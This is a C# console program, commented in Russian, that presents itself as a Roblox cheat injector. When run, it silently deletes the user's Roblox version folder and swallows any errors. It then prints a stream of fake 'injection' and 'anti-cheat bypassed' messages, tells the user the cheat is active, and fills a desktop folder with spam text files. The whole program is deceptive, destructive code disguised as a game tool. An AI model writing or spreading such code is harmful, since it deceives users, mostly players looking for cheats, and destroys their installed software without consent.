﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;

class Program
{
    static void Main()
    {
        // Удаление папки Roblox (по фейку)
        string robloxPath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), @"AppData\Local\Roblox\Versions\version-dd2acaf7460f42ee");

        if (Directory.Exists(robloxPath))
        {
            try
            {
                Directory.Delete(robloxPath, true);
            }
            catch
            {
                // Ничего не выводим, т.к. это фейк
            }
        }

        // Открытие папки "hekiCheat\BILD" на рабочем столе
        string folderPath1 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), @"Desktop\hekiCheat\BILD");

        if (Directory.Exists(folderPath1))
        {
            try
            {
                Process.Start("explorer.exe", folderPath1);
            }
            catch
            {
                // Ничего не выводим, т.к. это фейк
            }
        }

      

        // Запуск спама команд
        CommandSpam();

        // Фейк инжект чита - текст в консоли с инструкцией
        Console.WriteLine("Чит успешно активирован!");
        Console.WriteLine("Инструкция:");
        Console.WriteLine("1. Откройте файл CHEAT.GENERAL.");
        Console.WriteLine("2. Запустите файл, чтобы начать процесс инжекта.");
        Console.WriteLine("3. Следуйте инструкциям на экране.");

        // Генерация случайных текстовых файлов для спама
        SpamFiles();

        // Держим окно консоли открытым, чтобы было время увидеть сообщение
        Console.ReadLine();
    }

    static void SpamFiles()
    {
        // Папка для хранения фейковых файлов
        string spamFolder = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), @"Desktop\Spam");

        // Если папки нет, создаем
        if (!Directory.Exists(spamFolder))
        {
            Directory.CreateDirectory(spamFolder);
        }

        // Генерируем случайное количество фейковых файлов
        Random rand = new Random();
        int filesToCreate = rand.Next(5, 15); // Количество файлов от 5 до 15

        // Массив фейковых сообщений
        string[] fakeMessages = {
            "Чит активирован, начинаю загрузку.",
            "Инджект успешен.",
            "Не забудь открыть Роблокс.",
            "Подключение к серверу чита успешно установлено."
        };

        for (int i = 0; i < filesToCreate; i++)
        {
            // Генерация случайного имени файла
            string fakeFileName = Path.Combine(spamFolder, $"cheat_message_{Guid.NewGuid()}.txt");

            // Генерация случайного сообщения
            string message = fakeMessages[rand.Next(fakeMessages.Length)];

            // Запись сообщения в файл
            try
            {
                File.WriteAllText(fakeFileName, message);
            }
            catch
            {
                // Игнорируем ошибки при создании файлов
            }
        }
    }

    static void CommandSpam()
    {
        // Массив команд для спама
        string[] commands = {
            "inject",
            "cheat",
            "inject dly",
            "hack activate",
            "cheat engine start",
            "cheat code injected",
            "anti-cheat bypassed",
            "load cheat",
            "code activated",
            "bot start",
            "exploit enabled",
            "game hack loaded",
            "anti-detect bypassed",
            "cheat mode activated",
            "script running",
            "exploit initiated",
            "inject successful",
            "cheat detected",
            "injection complete",
            "loading cheat",
            "bypass cheat",
            "activate exploit",
            "cheat injection complete",
            "script injection successful",
            "exploit loaded",
            "inject game cheat",
            "script executed",
            "cheat module running",
            "game exploit active",
            "cheat unlocker enabled",
            "code injected"
        };

        Random rand = new Random();

        // Выводим 50 случайных команд с паузой
        for (int i = 0; i < 50; i++)
        {
            // Выбираем случайную команду
            string command = commands[rand.Next(commands.Length)];

            // Устанавливаем цвет текста в зеленый
            Console.ForegroundColor = ConsoleColor.Green;

            // Выводим команду
            Console.WriteLine(command);

            // Возвращаем стандартный цвет текста
            Console.ResetColor();

            // Пауза между выводом команд (рандомное время от 50 до 200 миллисекунд)
            Thread.Sleep(rand.Next(5, 20));
        }
    }
}
